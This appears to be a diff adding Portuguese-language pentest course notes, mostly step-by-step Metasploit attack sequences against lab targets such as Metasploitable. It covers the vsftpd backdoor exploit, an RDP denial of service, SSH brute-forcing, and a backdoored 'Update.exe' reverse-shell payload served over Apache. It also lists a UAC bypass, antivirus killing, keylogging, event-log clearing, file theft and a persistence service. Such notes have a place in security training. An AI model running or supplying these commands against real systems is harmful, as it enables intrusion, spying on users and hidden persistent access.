@@ -1,0 +1,233 @@
+Sourceforge.net -> Metasploitable
+login: msfadmin 
+password: msfadmin
+
+----------------------------------------------------------------
+
+REDES/IP:
+
+A - Networks / Hosts 255.0.0.0/8   
+
+B - N/H 255.255.0.0/16
+
+C - N/H 255.255.255.0/24
+
+
+nmap -> varrer em níveis de subredes, ou seja, hosts dentro de uma rede
+nmap NSE -> nmap scripting engine 
+
+TCP: protocolo padrão utilizado pelo Nmap
+UDP: scan no procolo UDP (não emite resposta)
+
+sudo nmap -Pn -sS -sC --script exploit scanme.nmap.org
+sudo nmap -p 80 --script dns.brute.nse nmap.org 
+
+sudo nmap -v -sU ip 
+sudo nmap -O ip
+sudo nmap -A ip
+sudo nmap -v -sS -T5 -p 22 ip 
+
+
+
+----------------------------------------------------------------
+
+FTP: método de compartilhamento de dados
+Vulnerabilidades no FTP: 
+- Anonymous authentication;
+- Directory traversal attack;
+- Cross-site scripting;
+- Dridex.
+
+Ferramentas do Metasploit: 
+- msfconsole: modo console;
+- msfweb: interface gráfica via browser;
+- msfplayload: gerar e customizar playloads (módulos para exploit, sendo de três tipos
+  singles, stagers, stages);
+- msfcli: interface de automatização de invasão;
+- msflogdump: exibirá as sessões de arquivos de logs. 
+
+Meterpreter: 
+- É um payload que funciona por injecção dll
+
+
+Passo a passo usado no curso, explorando falhas no FTP: 
+1) msfconsole 
+2) info exploit/unix/ftp/vsftpd_234_backdoor 
+3) use exploit/unix/ftp/vsftpd_234_backdoor
+4) set rhosts ip 
+5) set payload payload/cmd/unix/interact 
+6) show options
+7) exploit
+
+
+Ataque DoS no Remote Desktop Protocol (RDP) 
+- O serviço RDP pode ser configurado por administradores de sistemas windows para ser executado
+em TCP (geralmente na porta 3389) e/ou na porta UDP (3389)
+
+- Calling Into Robinhood
+- SamSam Ransomware 
+
+1) msfconsole
+2) search rdp 
+3) use auxiliary/dos/windows/rdp/ms12_020_maxchannelids 
+4) set rhosts ip 
+5) run 
+
+
+Explorando falhas no SSH, sendo executadas na porta 22
+
+1) msfconsole
+2) search ssh_login
+3) use auxiliary/scanner/ssh/ssh_login
+4) nano password.txt -> test password msfadmin
+5) nano user.txt -> test user msfadmin 
+6) set rhosts ip
+7) set USER_FILE /home/kali/user.txt
+8) set PASS_FILE /home/kali/password.txt
+9) exploit 
+10) sessions 
+
+
+Adicionando backdoor em um executável 
+
+-> Spyware, Ransomware, DDos, Cryptojacking
+
+1) msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=IP LPORT=4444 -o Update.exe
+2) service apache2 start 
+3) cp Update.exe /var/www/html 
+4) cd /var/www/html 
+5) msfconsole
+6) use multi/handler
+7) set payload windows/meterpreter/reverse_tcp
+8) set LHOST IP
+9) set LPORT 4444
+10) run 
+
+----------------------------------------------------------------
+
+Escalonamento de privilégios no Windows 
+
+1) msfconsole
+2) use multi/handler 
+3) set payload windows/meterpreter/reverse_tcp
+4) ip addr -> pegar o IP no eth0 inet
+5) set lhost ip kali
+6) set lport 4444
+7) run
+8) sysinfo
+9) getuid
+10) getsystem
+11) getpid
+12) ps
+13) pegar o pid do explore.exe e usar o comando: migrate 1280
+14) shell
+15) whoami
+16) whoami /priv
+17) exit
+18) background
+19) sessions
+20) search uac 
+22) use exploit/windows/local/bypassuac
+23) show options
+24) show targets
+25) set target0
+26) set payload windows/meterpreter/reverse_tcp
+27) set lhost ip kali
+27) set lport 2022
+28) set session 1
+29) exploit  
+30) background
+30) sessions
+31) sessions 3
+32) getsystem
+33) getuid
+34) shell
+35) whoami 
+36) whoami /priv
+
+----------------------------------------------------------------
+
+Extração de dados com Metasploit (capture the flag)  
+
+1) run post/windows/manage/killav
+2) run vnc
+3) screenshare
+4) keyscan_start
+5) keyscan_dump
+6) keyscan_stop
+7) clearev
+8) background
+9) sessions 3
+10) search -d C:/Users -f *.txt 
+11) download C:/Users/Cassiano/Documents/teste.txt
+12) upload ./testupload.txt C:/Users/Cassiano/Documents
+
+
+----------------------------------------------------------------
+
+Módulos de pós exploração no Metasploit:
+Extract credentials, privilege escalation modules, information gathering, spy/capture
+
+1) msfconsole
+2) use exploit/multi/handler
+3) set payload windows/meterpreter/reverse_tcp
+4) set lhost ip kali
+5) set lport 4444
+6) exploit
+7) background
+8) use post/windows/manage/migrate 
+9) set session 1
+10) run 
+11) session 1
+12) ps
+13) use post/windows/gather/checkvm
+14) set session 1
+15) run
+16) use post/windows/gather/enum_shares 
+17) set session 1
+18) exploit
+19) use post/windows/gather/enum_applications
+20) set session 1
+21) run
+22) use post/windows/gather/dumplinks
+23) set session 1
+24) run 
+25) use post/windows/gather/arp_scanner 
+26) set RHOSTS 192.168.56.1/24
+27) run 
+28) use post/multi/recon/local_exploit_suggester 
+29) set session 1
+30) set SHOWDESCRIPTION true
+31) run 
+
+----------------------------------------------------------------
+
+SCRIPTS:
+
+nano meterpreter.rc
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost IP KALI
+set lport 4444
+exploit -z
+
+msfconsole -r meterpreter.rc
+
+----------------------------------------------------------------
+
+Persistência de sessão no Metasploit
+
+1) msfconsole
+2) use exploit/multi/handler
+3) set payload windows/meterpreter/reverse_tcp
+4) set lhost IP KALI
+5) set lport 4444
+6) exploit 
+7) background
+8) use exploit/windows/local/persistence_service
+9) set session 1
+10) setlhost IP KALI
+11) setlport 2022
+12) exploit
+13) Meterpreter service exe written to C:\Users\Username\AppData\Local\Temp\GYQLK.exe
